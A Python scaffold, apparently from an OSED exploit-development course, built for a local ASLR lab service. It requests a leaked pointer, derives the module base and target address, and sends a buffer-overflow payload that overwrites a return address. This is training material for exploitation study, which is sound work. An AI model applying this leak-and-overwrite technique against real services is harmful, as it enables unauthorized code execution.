"""Benign leak-to-address scaffold for the local OSED ASLR lab."""

from __future__ import annotations

import argparse
from struct import pack, unpack

from exploit_scaffold import (
    CONTROL_V2_RECORD,
    OSED_MAGIC,
    OP_LEAK,
    OP_ROP,
    RECORD_QUERY,
    build_request,
    send_packet,
)

LEAK_RESPONSE_LENGTH = 20


def parse_leak_response(response: bytes) -> int:
    if len(response) != LEAK_RESPONSE_LENGTH:
        raise RuntimeError(f"unexpected leak response length: {len(response)}")

    magic, opcode, control, body_length = unpack("<IHHI", response[:12])
    if (magic, opcode, control, body_length) != (
        OSED_MAGIC,
        OP_LEAK,
        CONTROL_V2_RECORD,
        8,
    ):
        raise RuntimeError("unexpected leak response header")

    status, kind, value = unpack("<HHI", response[12:])
    if status != 0 or kind != RECORD_QUERY:
        raise RuntimeError("leak response reported an unexpected result")
    return value


def request_leak(host: str, port: int) -> int:
    response = send_packet(
        host,
        port,
        build_request(OP_LEAK, b""),
        response_length=LEAK_RESPONSE_LENGTH,
    )
    return parse_leak_response(response)


def derive_addresses(leak: int, anchor_rva: int, target_rva: int) -> tuple[int, int]:
    if leak < anchor_rva:
        raise ValueError("anchor RVA cannot exceed the leaked virtual address")
    module_base = leak - anchor_rva
    return module_base, module_base + target_rva


def build_control_payload(offset: int, target: int, total_length: int) -> bytes:
    if offset < 0:
        raise ValueError("offset must be non-negative")
    if total_length < offset + 4:
        raise ValueError("total length must include the overwritten return address")
    payload = bytearray(b"A" * offset)
    payload.extend(pack("<I", target))
    payload.extend(b"C" * (total_length - len(payload)))
    return bytes(payload)


def auto_int(value: str) -> int:
    return int(value, 0)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=9999)
    subparsers = parser.add_subparsers(dest="command", required=True)

    subparsers.add_parser("leak", help="request and print the runtime anchor pointer")

    calculate = subparsers.add_parser("calculate", help="derive base and target VAs")
    calculate.add_argument("--leak", type=auto_int, required=True)
    calculate.add_argument("--anchor-rva", type=auto_int, required=True)
    calculate.add_argument("--target-rva", type=auto_int, required=True)

    trigger = subparsers.add_parser("trigger", help="send a student-derived control payload")
    trigger.add_argument("--offset", type=auto_int, required=True)
    trigger.add_argument("--target", type=auto_int, required=True)
    trigger.add_argument("--length", type=auto_int, default=512)
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    if args.command == "leak":
        leak = request_leak(args.host, args.port)
        print(f"leak=0x{leak:08X}")
        return

    if args.command == "calculate":
        module_base, target = derive_addresses(args.leak, args.anchor_rva, args.target_rva)
        print(f"module_base=0x{module_base:08X}")
        print(f"target=0x{target:08X}")
        return

    payload = build_control_payload(args.offset, args.target, args.length)
    response = send_packet(
        args.host,
        args.port,
        build_request(OP_ROP, payload),
        expect_response=False,
    )
    if response:
        print(response.decode("ascii", errors="replace"), end="")


if __name__ == "__main__":
    main()
